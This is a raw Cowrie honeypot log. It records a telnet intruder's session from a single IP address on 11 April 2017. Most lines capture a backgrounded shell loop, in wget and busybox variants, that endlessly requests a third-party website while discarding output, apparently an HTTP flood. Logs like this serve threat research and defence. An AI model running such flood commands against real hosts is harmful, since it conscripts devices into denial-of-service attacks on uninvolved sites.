2017-04-11T11:51:43+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: enable 
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] Reading txtcmd from "txtcmds/bin/enable"
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: system
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: system
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh 
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: run
2017-04-11T11:51:44+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: run
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command not found: "while true; do /bin/busybox wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done"
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] CMD: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
2017-04-11T11:51:54+0000 [CowrieTelnetTransport,223307,93.174.95.38] Command found: sh -c "while true; do wget -O /dev/null http://facesgeek.com:80/ > /dev/null 2> /dev/null; done" &
